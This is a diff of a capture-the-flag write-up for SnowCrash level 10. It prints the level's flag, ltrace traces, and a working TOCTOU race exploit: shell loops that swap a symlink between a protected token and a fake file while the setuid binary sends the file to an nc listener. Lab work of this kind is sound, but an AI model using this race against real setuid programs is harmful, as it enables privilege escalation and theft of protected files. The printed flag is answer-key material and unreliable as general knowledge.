@@ -1,4 +1,12 @@
+# Level10
+
+## Flag
+feulo4b72j7edeahuete3no7c
+
+---
 on level 10, we have
+
+```
 the dr-xr-x---+ 1 level10 level10 140 Mar 6 2016 ./
 d--x--x--x 1 root users 340 Aug 30 2015 ../
 -r-x------ 1 level10 level10 220 Apr 3 2012 .bash_logout*
@@ -6,10 +14,13 @@ d--x--x--x 1 root users 340 Aug 30 2015 ../
 -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
 -r-x------  1 level10 level10   675 Apr  3  2012 .profile*
 -rw-------  1 flag10  flag10     26 Mar  5  2016 token
+```
 
 we roll through the principles as from level 8, first the balloon to see the ltrace
+```
 echo "lol" > /tmp/level10/lol
-
+```
+```
 level10@SnowCrash:~$ ltrace ./level10 /tmp/level10/lol
 __libc_start_main(0x80486d4, 2, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
 printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
@@ -17,9 +28,11 @@ printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
 ) = 65
 exit(1 <unfinished ...>
 +++ exited (status 1) +++
+```
 
 returns an error because the 3rd argument should be accepted. there aren't many options, we use the localhost
 
+```
 level10@SnowCrash:~$ ltrace ./level10 /tmp/level10/lol 127.0.0.1
 __libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
 access("/tmp/level10/lol", 4)                              = 0
@@ -33,13 +46,17 @@ printf("Unable to connect to host %s\n", "127.0.0.1"Unable to connect to host 12
 )      = 36
 exit(1 <unfinished ...>
 +++ exited (status 1) +++
+```
 
 port 6969 is specified
 
 we are trying to connect to this port (we start the server that listens to port 6969)
+```
 nc -l 6969
+```
 
 there is a connection
+```
 level10@SnowCrash:~$ ltrace ./level10 /tmp/level10/lol 127.0.0.1
 __libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
 access("/tmp/level10/lol", 4) = 0
@@ -59,11 +76,15 @@ write(3, "lol\n", 4)                                       = 4
 puts("wrote file!"wrote file!
 )                                        = 12
 +++ exited (status 12) +++
-
+```
 the server displayed 
+```
 level10@SnowCrash:~$ nc -l 6969
 .*( )*.
 lol
+```
+
+## Solution
 
 to hack a token based on access rights, we use the vulnerability of the access
 man access function
@@ -81,18 +102,22 @@ we use nc -lk 6969 with -lk flags
 -k: This parameter tells nc to continue listening even after one connection is established.
 
 our task is to run 2 processes with our binaries, one for a fake token, the second for a real one.
-
+```
 echo "asd" > /tmp/level10/faketoken
-
+```
 key substitution
+```
 while true; do ln -fs /home/user/level10/token /tmp/level10/lol; ln -sf /tmp/level10/faketoken /tmp/level10/lol; done
-
+```
 binary pump
+```
 while true; do /home/user/level10/level10 /tmp/level10/lol 127.0.0.1; done
+```
+## How it works
 
-How it works
 You are trying to exploit the race condition when accessing the file so that the binary file /home/user/level10/level10 sends a real one instead of a fake token, which is located in /home/user/level10/token.
-1. How the level10 binary file works
+
+### How the level10 binary file works
 It can be seen from ltrace that the program:
 Checks access to the transferred file (access("/tmp/level10/faketoken", 4))
 Displays a connection message
@@ -103,7 +128,7 @@ Ends.
 
 That is, the program takes a file, reads it, and sends the contents over the network.
 
-Creating a file with fake content.
+### Creating a file with fake content.
 the loop endlessly changes the symbolic link /tmp/level10/lol:
 At one point, /tmp/level10/lol points to /home/user/level10/token (which contains the real token)
 The next moment, /tmp/level10/lol points to /tmp/level10/faketoken
